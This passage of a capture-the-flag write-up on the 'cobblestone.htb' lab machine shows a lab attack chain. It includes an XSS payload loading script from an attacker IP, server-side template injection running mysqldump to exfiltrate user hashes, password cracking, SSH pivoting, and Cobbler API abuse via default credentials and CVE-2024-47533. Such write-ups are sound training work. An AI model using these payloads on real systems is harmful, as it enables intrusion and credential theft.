10.129.48.200 - - [06/May/2026 11:34:07] "GET /?i=1&r=Mzk7KzAwOjAwJiMwMzk7ICovOwovKiE0MDAxNCBTRVQgQE9MRF9VTklRVUVfQ0hFQ0tTPUBAVU5JUVVFX0NIRUNLUywgVU5JUVVFX0NIRUNLUz0wICovOwovKiE0MDAxNCBTRVQgQE9MRF9GT1JFSUdOX0tFWV9DSEVDS1M9QEBGT1JFSUdOX0tFWV9DSEVDS1MsIEZPUkVJR05fS0VZX0NIRUNLUz0wICovOwovKiE0MDEwMSBTRVQgQE9MRF9TUUxfTU9ERT1AQFNRTF9NT0RFLCBTUUxfTU9ERT0mIzAzOTtOT19BVVRPX1ZBTFVFX09OX1pFUk8mIzAzOTsgKi87Ci8qTSExMDA2MTYgU0VUIEBPTERfTk9URV9WRVJCT1NJVFk9QEBOT1RFX1ZFUkJPU0lUWSwgTk9URV9WRVJCT1NJVFk9MCAqLzsKCi0tCi0tIFRhYmxlIHN0cnVjdHVyZSBmb3IgdGFibGUgYHVzZXJzYAotLQoKRFJPUCBUQUJMRSBJRiBFWElTVFMgYHVzZXJzYDsKLyohNDAxMDEgU0VUIEBzYXZlZF9jc19jbGllbnQgICAgID0gQEBjaGFyYWN0ZXJfc2V0X2NsaWVudCAqLzsKLyohNDAxMDEgU0VUIGNoYXJhY3Rlcl9zZXRfY2xpZW50ID0gdXRmOG1iNCAqLzsKQ1JFQVRFIFRBQkxFIGB1c2Vyc2AgKAogIGBpZGAgaW50KDExKSBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVCwKICBgVXNlcm5hbWVgIHZhcmNo HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 11:34:08] "GET /?i=0&r=PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSA8L2gxPg== HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 11:34:08] "GET /?i=0&r=PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSAvKk0hOTk5OTk5XC0gZW5hYmxlIHRoZSBzYW5kYm94IG1vZGUgKi8gCi0tIE1hcmlhREIgZHVtcCAxMC4xOS0xMi4wLjItTWFyaWFEQiwgZm9yIGRlYmlhbi1saW51eC1nbnUgKHg4Nl82NCkKLS0KLS0gSG9zdDogMTI3LjAuMC4xICAgIERhdGFiYXNlOiBjb2JibGVzdG9uZQotLSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0gU2VydmVyIHZlcnNpb24JMTIuMC4yLU1hcmlhREItZGViMTItbG9nCgovKiE0MDEwMSBTRVQgQE9MRF9DSEFSQUNURVJfU0VUX0NMSUVOVD1AQENIQVJBQ1RFUl9TRVRfQ0xJRU5UICovOwovKiE0MDEwMSBTRVQgQE9MRF9DSEFSQUNURVJfU0VUX1JFU1VMVFM9QEBDSEFSQUNURVJfU0VUX1JFU1VMVFMgKi87Ci8qITQwMTAxIFNFVCBAT0xEX0NPTExBVElPTl9DT05ORUNUSU9OPUBAQ09MTEFUSU9OX0NPTk5FQ1RJT04gKi87Ci8qITQwMTAxIFNFVCBOQU1FUyB1dGY4bWI0ICovOwovKiE0MDEwMyBTRVQgQE9MRF9USU1FX1pPTkU9QEBUSU1FX1pPTkUgKi87Ci8qITQwMTAzIFNFVCBUSU1FX1pPTkU9JiMw HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 11:34:08] "GET /?i=1&r=Mzk7KzAwOjAwJiMwMzk7ICovOwovKiE0MDAxNCBTRVQgQE9MRF9VTklRVUVfQ0hFQ0tTPUBAVU5JUVVFX0NIRUNLUywgVU5JUVVFX0NIRUNLUz0wICovOwovKiE0MDAxNCBTRVQgQE9MRF9GT1JFSUdOX0tFWV9DSEVDS1M9QEBGT1JFSUdOX0tFWV9DSEVDS1MsIEZPUkVJR05fS0VZX0NIRUNLUz0wICovOwovKiE0MDEwMSBTRVQgQE9MRF9TUUxfTU9ERT1AQFNRTF9NT0RFLCBTUUxfTU9ERT0mIzAzOTtOT19BVVRPX1ZBTFVFX09OX1pFUk8mIzAzOTsgKi87Ci8qTSExMDA2MTYgU0VUIEBPTERfTk9URV9WRVJCT1NJVFk9QEBOT1RFX1ZFUkJPU0lUWSwgTk9URV9WRVJCT1NJVFk9MCAqLzsKCi0tCi0tIFRhYmxlIHN0cnVjdHVyZSBmb3IgdGFibGUgYHVzZXJzYAotLQoKRFJPUCBUQUJMRSBJRiBFWElTVFMgYHVzZXJzYDsKLyohNDAxMDEgU0VUIEBzYXZlZF9jc19jbGllbnQgICAgID0gQEBjaGFyYWN0ZXJfc2V0X2NsaWVudCAqLzsKLyohNDAxMDEgU0VUIGNoYXJhY3Rlcl9zZXRfY2xpZW50ID0gdXRmOG1iNCAqLzsKQ1JFQVRFIFRBQkxFIGB1c2Vyc2AgKAogIGBpZGAgaW50KDExKSBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVCwKICBgVXNlcm5hbWVgIHZhcmNo HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 11:34:08] "GET /?i=2&r=YXIoMjU1KSBERUZBVUxUIE5VTEwsCiAgYEZpcnN0TmFtZWAgdmFyY2hhcigyNTUpIERFRkFVTFQgTlVMTCwKICBgTGFzdE5hbWVgIHZhcmNoYXIoMjU1KSBERUZBVUxUIE5VTEwsCiAgYEVtYWlsYCB2YXJjaGFyKDI1NSkgREVGQVVMVCBOVUxMLAogIGBSb2xlYCB2YXJjaGFyKDI1NSkgREVGQVVMVCBOVUxMLAogIGBQYXNzd29yZGAgdmFyY2hhcigyNTUpIERFRkFVTFQgTlVMTCwKICBgcmVnaXN0ZXJfaXBgIHZhcmNoYXIoMTAwKSBERUZBVUxUIE5VTEwsCiAgUFJJTUFSWSBLRVkgKGBpZGApCikgRU5HSU5FPUlubm9EQiBBVVRPX0lOQ1JFTUVOVD00IERFRkFVTFQgQ0hBUlNFVD11dGY4bWI0IENPTExBVEU9dXRmOG1iNF9nZW5lcmFsX2NpOwovKiE0MDEwMSBTRVQgY2hhcmFjdGVyX3NldF9jbGllbnQgPSBAc2F2ZWRfY3NfY2xpZW50ICovOwoKLS0KLS0gRHVtcGluZyBkYXRhIGZvciB0YWJsZSBgdXNlcnNgCi0tCgpMT0NLIFRBQkxFUyBgdXNlcnNgIFdSSVRFOwovKiE0MDAwMCBBTFRFUiBUQUJMRSBgdXNlcnNgIERJU0FCTEUgS0VZUyAqLzsKc2V0IGF1dG9jb21taXQ9MDsKSU5TRVJUIElOVE8gYHVzZXJzYCBWQUxVRVMKKDEsJiMwMzk7YWRtaW4mIzAz HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 11:34:09] "GET /?i=3&r=OTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW5AY29iYmxlc3RvbmUuaHRiJiMwMzk7LCYjMDM5O2FkbWluJiMwMzk7LCYjMDM5O2Y0MTY2ZDI2M2YyNWE4NjJmYTFiNzcxMTY2OTMyNTNjMjRkMThhMzZmNWFjNTk3ZDhhMDFiMTBhMjVjNTYwZDEmIzAzOTssJiMwMzk7KiYjMDM5OyksCigyLCYjMDM5O2NvYmJsZSYjMDM5OywmIzAzOTtjb2JibGUmIzAzOTssJiMwMzk7c3RvbmUmIzAzOTssJiMwMzk7Y29iYmxlQGNvYmJsZXN0b25lLmh0YiYjMDM5OywmIzAzOTthZG1pbiYjMDM5OywmIzAzOTsyMGNkYzUwNzNlOWU3YTc2MzFlOWQzNWI1ZTEyODJhNGZlNmE4MDQ5ZThhODRjODI5ODc0NzMzMjFiMGE4ZjRkJiMwMzk7LCYjMDM5OyomIzAzOTspLAooMywmIzAzOTt0ZXN0JiMwMzk7LCYjMDM5O3Rlc3QmIzAzOTssJiMwMzk7dGVzdCYjMDM5OywmIzAzOTt0ZXN0QHRlc3QuY29tJiMwMzk7LCYjMDM5O3VzZXImIzAzOTssJiMwMzk7OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZjMTViMGYwMGEwOCYjMDM5OywmIzAzOTsxMC4xMC4xNi4xMjYmIzAzOTspOwovKiE0MDAwMCBB HTTP/1.1" 200 -
<img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/xploit.js';document.body.appendChild(s)"><img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/xploit.js';document.body.appendChild(s)">

```

- Decoding the last chunk we get some hashes which crack from crackstation itself:
```
echo "OTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW5AY29iYmxlc3RvbmUuaHRiJiMwMzk7LCYjMDM5O2FkbWluJiMwMzk7LCYjMDM5O2Y0MTY2ZDI2M2YyNWE4NjJmYTFiNzcxMTY2OTMyNTNjMjRkMThhMzZmNWFjNTk3ZDhhMDFiMTBhMjVjNTYwZDEmIzAzOTssJiMwMzk7KiYjMDM5OyksCigyLCYjMDM5O2NvYmJsZSYjMDM5OywmIzAzOTtjb2JibGUmIzAzOTssJiMwMzk7c3RvbmUmIzAzOTssJiMwMzk7Y29iYmxlQGNvYmJsZXN0b25lLmh0YiYjMDM5OywmIzAzOTthZG1pbiYjMDM5OywmIzAzOTsyMGNkYzUwNzNlOWU3YTc2MzFlOWQzNWI1ZTEyODJhNGZlNmE4MDQ5ZThhODRjODI5ODc0NzMzMjFiMGE4ZjRkJiMwMzk7LCYjMDM5OyomIzAzOTspLAooMywmIzAzOTt0ZXN0JiMwMzk7LCYjMDM5O3Rlc3QmIzAzOTssJiMwMzk7dGVzdCYjMDM5OywmIzAzOTt0ZXN0QHRlc3QuY29tJiMwMzk7LCYjMDM5O3VzZXImIzAzOTssJiMwMzk7OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZjMTViMGYwMGEwOCYjMDM5OywmIzAzOTsxMC4xMC4xNi4xMjYmIzAzOTspOwovKiE0MDAwMCBB" | base64 -d
9;,&#039;admin&#039;,&#039;admin&#039;,&#039;admin@cobblestone.htb&#039;,&#039;admin&#039;,&#039;f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1&#039;,&#039;*&#039;),
(2,&#039;cobble&#039;,&#039;cobble&#039;,&#039;stone&#039;,&#039;cobble@cobblestone.htb&#039;,&#039;admin&#039;,&#039;20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d&#039;,&#039;*&#039;),
(3,&#039;test&#039;,&#039;test&#039;,&#039;test&#039;,&#039;test@test.com&#039;,&#039;user&#039;,&#039;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#039;,&#039;10.10.16.126&#039;);
/*!40000 A
```

![[Pasted image 20260506114210.png]]
- Alternatively we can get the outptu from burpsuite:
```
POST /preview_banner.php HTTP/1.1
Host: cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://cobblestone.htb/skins.php
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 117
Origin: http://cobblestone.htb
Connection: keep-alive
Cookie: PHPSESSID=skqkk77dgr5q8crb22njue9koa
Priority: u=0

first={{['mysqldump+-h127.0.0.1+-udbuser+-paichooDeeYanaekungei9rogi0eMuo2o+cobblestone+users']|map('system')|join}}"
```
![[Pasted image 20260506141354.png]]


- Alternatively can decode everythign with python:
```
python3 << 'EOF'
import base64

chunks = [
    "PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSAvKk0hOTk5OTk5XC0gZW5hYmxlIHRoZSBzYW5kYm94IG1vZGUgKi8gCi0tIE1hcmlhREIgZHVtcCAxMC4xOS0xMi4wLjItTWFyaWFEQiwgZm9yIGRlYmlhbi1saW51eC1nbnUgKHg4Nl82NCkKLS0KLS0gSG9zdDogMTI3LjAuMC4xICAgIERhdGFiYXNlOiBjb2JibGVzdG9uZQotLSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0gU2VydmVyIHZlcnNpb24JMTIuMC4yLU1hcmlhREItZGViMTItbG9nCgovKiE0MDEwMSBTRVQgQE9MRF9DSEFSQUNURVJfU0VUX0NMSUVOVD1AQENIQVJBQ1RFUl9TRVRfQ0xJRU5UICovOwovKiE0MDEwMSBTRVQgQE9MRF9DSEFSQUNURVJfU0VUX1JFU1VMVFM9QEBDSEFSQUNURVJfU0VUX1JFU1VMVFMgKi87Ci8qITQwMTAxIFNFVCBAT0xEX0NPTExBVElPTl9DT05ORUNUSU9OPUBAQ09MTEFUSU9OX0NPTk5FQ1RJT04gKi87Ci8qITQwMTAxIFNFVCBOQU1FUyB1dGY4bWI0ICovOwovKiE0MDEwMyBTRVQgQE9MRF9USU1FX1pPTkU9QEBUSU1FX1pPTkUgKi87Ci8qITQwMTAzIFNFVCBUSU1FX1pPTkU9JiMw",
    "Mzk7KzAwOjAwJiMwMzk7ICovOwovKiE0MDAxNCBTRVQgQE9MRF9VTklRVUVfQ0hFQ0tTPUBAVU5JUVVFX0NIRUNLUywgVU5JUVVFX0NIRUNLUz0wICovOwovKiE0MDAxNCBTRVQgQE9MRF9GT1JFSUdOX0tFWV9DSEVDS1M9QEBGT1JFSUdOX0tFWV9DSEVDS1MsIEZPUkVJR05fS0VZX0NIRUNLUz0wICovOwovKiE0MDEwMSBTRVQgQE9MRF9TUUxfTU9ERT1AQFNRTF9NT0RFLCBTUUxfTU9ERT0mIzAzOTtOT19BVVRPX1ZBTFVFX09OX1pFUk8mIzAzOTsgKi87Ci8qTSExMDA2MTYgU0VUIEBPTERfTk9URV9WRVJCT1NJVFk9QEBOT1RFX1ZFUkJPU0lUWSwgTk9URV9WRVJCT1NJVFk9MCAqLzsKCi0tCi0tIFRhYmxlIHN0cnVjdHVyZSBmb3IgdGFibGUgYHVzZXJzYAotLQoKRFJPUCBUQUJMRSBJRiBFWElTVFMgYHVzZXJzYDsKLyohNDAxMDEgU0VUIEBzYXZlZF9jc19jbGllbnQgICAgID0gQEBjaGFyYWN0ZXJfc2V0X2NsaWVudCAqLzsKLyohNDAxMDEgU0VUIGNoYXJhY3Rlcl9zZXRfY2xpZW50ID0gdXRmOG1iNCAqLzsKQ1JFQVRFIFRBQkxFIGB1c2Vyc2AgKAogIGBpZGAgaW50KDExKSBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVCwKICBgVXNlcm5hbWVgIHZhcmNo",
    "YXIoMjU1KSBERUZBVUxUIE5VTEwsCiAgYEZpcnN0TmFtZWAgdmFyY2hhcigyNTUpIERFRkFVTFQgTlVMTCwKICBgTGFzdE5hbWVgIHZhcmNoYXIoMjU1KSBERUZBVUxUIE5VTEwsCiAgYEVtYWlsYCB2YXJjaGFyKDI1NSkgREVGQVVMVCBOVUxMLAogIGBSb2xlYCB2YXJjaGFyKDI1NSkgREVGQVVMVCBOVUxMLAogIGBQYXNzd29yZGAgdmFyY2hhcigyNTUpIERFRkFVTFQgTlVMTCwKICBgcmVnaXN0ZXJfaXBgIHZhcmNoYXIoMTAwKSBERUZBVUxUIE5VTEwsCiAgUFJJTUFSWSBLRVkgKGBpZGApCikgRU5HSU5FPUlubm9EQiBBVVRPX0lOQ1JFTUVOVD01IERFRkFVTFQgQ0hBUlNFVD11dGY4bWI0IENPTExBVEU9dXRmOG1iNF9nZW5lcmFsX2NpOwovKiE0MDEwMSBTRVQgY2hhcmFjdGVyX3NldF9jbGllbnQgPSBAc2F2ZWRfY3NfY2xpZW50ICovOwoKLS0KLS0gRHVtcGluZyBkYXRhIGZvciB0YWJsZSBgdXNlcnNgCi0tCgpMT0NLIFRBQkxFUyBgdXNlcnNgIFdSSVRFOwovKiE0MDAwMCBBTFRFUiBUQUJMRSBgdXNlcnNgIERJU0FCTEUgS0VZUyAqLzsKc2V0IGF1dG9jb21taXQ9MDsKSU5TRVJUIElOVE8gYHVzZXJzYCBWQUxVRVMKKDEsJiMwMzk7YWRtaW4mIzAz",
    "OTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW4mIzAzOTssJiMwMzk7YWRtaW5AY29iYmxlc3RvbmUuaHRiJiMwMzk7LCYjMDM5O2FkbWluJiMwMzk7LCYjMDM5O2Y0MTY2ZDI2M2YyNWE4NjJmYTFiNzcxMTY2OTMyNTNjMjRkMThhMzZmNWFjNTk3ZDhhMDFiMTBhMjVjNTYwZDEmIzAzOTssJiMwMzk7KiYjMDM5OyksCigyLCYjMDM5O2NvYmJsZSYjMDM5OywmIzAzOTtjb2JibGUmIzAzOTssJiMwMzk7c3RvbmUmIzAzOTssJiMwMzk7Y29iYmxlQGNvYmJsZXN0b25lLmh0YiYjMDM5OywmIzAzOTthZG1pbiYjMDM5OywmIzAzOTsyMGNkYzUwNzNlOWU3YTc2MzFlOWQzNWI1ZTEyODJhNGZlNmE4MDQ5ZThhODRjODI5ODc0NzMzMjFiMGE4ZjRkJiMwMzk7LCYjMDM5OyomIzAzOTspLAooMywmIzAzOTtkYWxlJiMwMzk7LCYjMDM5O2RhbGUmIzAzOTssJiMwMzk7Y29vcGVyJiMwMzk7LCYjMDM5O2RhbGUuY29vcGVyQHByb3Rvbi5tZSYjMDM5OywmIzAzOTt1c2VyJiMwMzk7LCYjMDM5OzVlODg0ODk4ZGEyODA0NzE1MWQwZTU2ZjhkYzYyOTI3NzM2MDNkMGQ2YWFiYmRkNjJhMTFlZjcyMWQxNTQyZDgmIzAzOTssJiMwMzk7MTAuMTAuMTQuMTcxJiMwMzk7KSwK",
    "KDQsJiMwMzk7dGVzdCYjMDM5OywmIzAzOTt0ZXN0JiMwMzk7LCYjMDM5O3Rlc3QmIzAzOTssJiMwMzk7dGVzdEB0ZXN0LmNvbSYjMDM5OywmIzAzOTt1c2VyJiMwMzk7LCYjMDM5OzlmODZkMDgxODg0YzdkNjU5YTJmZWFhMGM1NWFkMDE1YTNiZjRmMWIyYjBiODIyY2QxNWQ2YzE1YjBmMDBhMDgmIzAzOTssJiMwMzk7MTAuMTAuMTYuMTI2JiMwMzk7KTsKLyohNDAwMDAgQUxURVIgVEFCTEUgYHVzZXJzYCBFTkFCTEUgS0VZUyAqLzsKVU5MT0NLIFRBQkxFUzsKY29tbWl0OwovKiE0MDEwMyBTRVQgVElNRV9aT05FPUBPTERfVElNRV9aT05FICovOwoKLyohNDAxMDEgU0VUIFNRTF9NT0RFPUBPTERfU1FMX01PREUgKi87Ci8qITQwMDE0IFNFVCBGT1JFSUdOX0tFWV9DSEVDS1M9QE9MRF9GT1JFSUdOX0tFWV9DSEVDS1MgKi87Ci8qITQwMDE0IFNFVCBVTklRVUVfQ0hFQ0tTPUBPTERfVU5JUVVFX0NIRUNLUyAqLzsKLyohNDAxMDEgU0VUIENIQVJBQ1RFUl9TRVRfQ0xJRU5UPUBPTERfQ0hBUkFDVEVSX1NFVF9DTElFTlQgKi87Ci8qITQwMTAxIFNFVCBDSEFSQUNURVJfU0VUX1JFU1VMVFM9QE9MRF9DSEFSQUNURVJfU0VUX1JFU1VMVFMgKi87Ci8qITQwMTAx",
    "IFNFVCBDT0xMQVRJT05fQ09OTkVDVElPTj1AT0xEX0NPTExBVElPTl9DT05ORUNUSU9OICovOwovKk0hMTAwNjE2IFNFVCBOT1RFX1ZFUkJPU0lUWT1AT0xEX05PVEVfVkVSQk9TSVRZICovOwoKLS0gRHVtcCBjb21wbGV0ZWQgb24gMjAyNi0wNS0wNSAgODoxNzowNwotLSBEdW1wIGNvbXBsZXRlZCBvbiAyMDI2LTA1LTA1ICA4OjE3OjA3PC9oMT4="
]

full = ''.join(chunks)
decoded = base64.b64decode(full).decode('utf-8', errors='replace')
print(decoded)
EOF


---OUTPUT---
<h1 class="text-light display-3">Welcome /*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19-12.0.2-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: 127.0.0.1    Database: cobblestone
-- ------------------------------------------------------
-- Server version       12.0.2-MariaDB-deb12-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE=&#039;+00:00&#039; */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#039;NO_AUTO_VALUE_ON_ZERO&#039; */;
/*M!100616 SET @OLD_NOTE_VERBOSITY=@@NOTE_VERBOSITY, NOTE_VERBOSITY=0 */;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `Username` varchar(255) DEFAULT NULL,
  `FirstName` varchar(255) DEFAULT NULL,
  `LastName` varchar(255) DEFAULT NULL,
  `Email` varchar(255) DEFAULT NULL,
  `Role` varchar(255) DEFAULT NULL,
  `Password` varchar(255) DEFAULT NULL,
  `register_ip` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES
(1,&#039;admin&#039;,&#039;admin&#039;,&#039;admin&#039;,&#039;admin@cobblestone.htb&#039;,&#039;admin&#039;,&#039;f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1&#039;,&#039;*&#039;),
(2,&#039;cobble&#039;,&#039;cobble&#039;,&#039;stone&#039;,&#039;cobble@cobblestone.htb&#039;,&#039;admin&#039;,&#039;20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d&#039;,&#039;*&#039;),
(3,&#039;dale&#039;,&#039;dale&#039;,&#039;cooper&#039;,&#039;dale.cooper@proton.me&#039;,&#039;user&#039;,&#039;5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8&#039;,&#039;10.10.14.171&#039;),
(4,&#039;test&#039;,&#039;test&#039;,&#039;test&#039;,&#039;test@test.com&#039;,&#039;user&#039;,&#039;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#039;,&#039;10.10.16.126&#039;);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*M!100616 SET NOTE_VERBOSITY=@OLD_NOTE_VERBOSITY */;

-- Dump completed on 2026-05-05  8:17:07
-- Dump completed on 2026-05-05  8:17:07</h1>
```


- Using crackstation (or hashcat 1400) I crack cobble's hash to be `iluvdannymorethanyouknow`
![[Pasted image 20260505093108.png]]

- I can ssh into target but commadns dont work..atleast the ones we know:
```
ssh cobble@cobblestone.htb
> iluvdannymorethanyouknow
```
![[Pasted image 20260505093243.png]]

- However we are able to list and read files so we can read user.txt:
```
pwd
ls
cat user.txt
```
![[Pasted image 20260505093425.png]]

- It seems to be a restricted shell:
![[Pasted image 20260505095413.png]]

- Remembering the info from 000-default conf it spoke of an api cobbler-api at `http://127.0.0.1:25151`
- Also using `ss` we can see its opne:
![[Pasted image 20260505100353.png]]
- We can do a port forwarding via ssh:
```
ssh -L 25151:127.0.0.1:25151 cobble@cobblestone.htb    
cobble@cobblestone.htb's password: iluvdannymorethanyouknow
```
- Scanning with nmap I see its a XMLRPC enpoint:
```
nmap -sV -sC -vv 127.0.0.1 -p 25151

---OUTPUT---
PORT      STATE SERVICE REASON         VERSION
25151/tcp open  http    syn-ack ttl 64 BaseHTTPServer 0.6 (Python 3.11.2)
|_xmlrpc-methods: XMLRPC instance doesn't support introspection.
|_http-server-header: BaseHTTP/0.6 Python/3.11.2
|_http-title: Error response
| http-methods: 
|_  Supported Methods: POST OPTIONS
```

- Note there are already some public exploits but we search a bit on our own. cobbler has some commands we can use so we can test it with some curl commands.

- using curl command i perform some tests:
```
curl -i -X POST http://127.0.0.1:25151/


HTTP/1.0 500 Internal Server Error
Server: BaseHTTP/0.6 Python/3.11.2
Date: Tue, 05 May 2026 14:19:25 GMT
Content-length: 0
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Origin: *
```

- Find version:
```
curl -s -X POST http://127.0.0.1:25151/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>version</methodName>
  <params></params>
</methodCall>'     


<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><double>3.306</double></value>
</param>
</params>
</methodResponse>
```

- I try to authenticate myself with default credentials `cobbler:cobbler` and it works. Alternatively using no username and `-1` as password also authenticated implying no credentials are required:
```
curl -s -X POST http://127.0.0.1:25151/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>login</methodName>
  <params>
    <param><value><string>cobbler</string></value></param>
    <param><value><string>cobbler</string></value></param>
  </params>
</methodCall>'


<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><string>eYVxPaqJ1pnWnnwK0Yf8NUWMSHppXVjWKQ==</string></value>
</param>
</params>
</methodResponse>
```
- But the intended path is to find a vulnerability CVE-2024-47533 where we can bypass authentication by putting username as nothing `""` and password set to -1.
- I get a token. 
-  So with this token I can pass commands 
- Looking at auto isntall tempaltes:
```
curl -s -X POST http://127.0.0.1:25151/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>get_autoinstall_templates</methodName>
  <params>
    <param><value><string>eYVxPaqJ1pnWnnwK0Yf8NUWMSHppXVjWKQ==</string></value></param>
  </params>
</methodCall>'


<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><array><data>
<value><string>default.ks</string></value>
<value><string>esxi4-ks.cfg</string></value>
<value><string>esxi5-ks.cfg</string></value>
<value><string>legacy.ks</string></value>
<value><string>powerkvm.ks</string></value>
<value><string>pxerescue.ks</string></value>
<value><string>sample.ks</string></value>
<value><string>sample.seed</string></value>
<value><string>sample_autoyast.xml</string></value>
<value><string>sample_esxi4.ks</string></value>
<value><string>sample_esxi5.ks</string></value>
<value><string>sample_esxi6.ks</string></value>
<value><string>sample_esxi7.ks</string></value>
<value><string>sample_legacy.ks</string></value>
<value><string>sample_old.seed</string></value>
<value><string>win.ks</string></value>
</data></array></value>
</param>
</params>
</methodResponse>
```
- Get distros:
```
curl -s -X POST http://127.0.0.1:25151/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>get_distros</methodName>
  <params>
    <param><value><string>eYVxPaqJ1pnWnnwK0Yf8NUWMSHppXVjWKQ==</string></value></param>
  </params>
</methodCall>'
<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><array><data>
<value><struct>
<member>
<name>parent</name>
<value><string></string></value>
</member>
<member>
<name>depth</name>
<value><int>0</int></value>
</member>
<member>
<name>ctime</name>
<value><double>1777991787.8279727</double></value>
</member>
<member>
<name>mtime</name>
<value><double>1777991787.8279727</double></value>
</member>
<member>
<name>uid</name>
<value><string>3cc174f5089241aea0aa3d10a3cfff4c</string></value>
</member>
<member>
<name>name</name>
<value><string>pwndistro</string></value>
</member>
<member>
<name>comment</name>
<value><string></string></value>
</member>
<member>
<name>kernel_options</name>
<value><struct>
</struct></value>
</member>
<member>
<name>kernel_options_post</name>
<value><struct>
</struct></value>
</member>
<member>
<name>autoinstall_meta</name>
<value><struct>
</struct></value>
</member>
<member>
<name>fetchable_files</name>
<value><struct>
</struct></value>
</member>
<member>
<name>boot_files</name>
<value><struct>
</struct></value>
</member>
<member>
<name>template_files</name>
<value><struct>
</struct></value>
</member>
<member>
<name>owners</name>
<value><string>&lt;&lt;inherit&gt;&gt;</string></value>
</member>
<member>
<name>mgmt_classes</name>
<value><array><data>
</data></array></value>
</member>
<member>
<name>mgmt_parameters</name>
<value><struct>
</struct></value>
</member>
<member>
<name>is_subobject</name>
<value><boolean>0</boolean></value>
</member>
<member>
<name>tree_build_time</name>
<value><double>0.0</double></value>
</member>
<member>
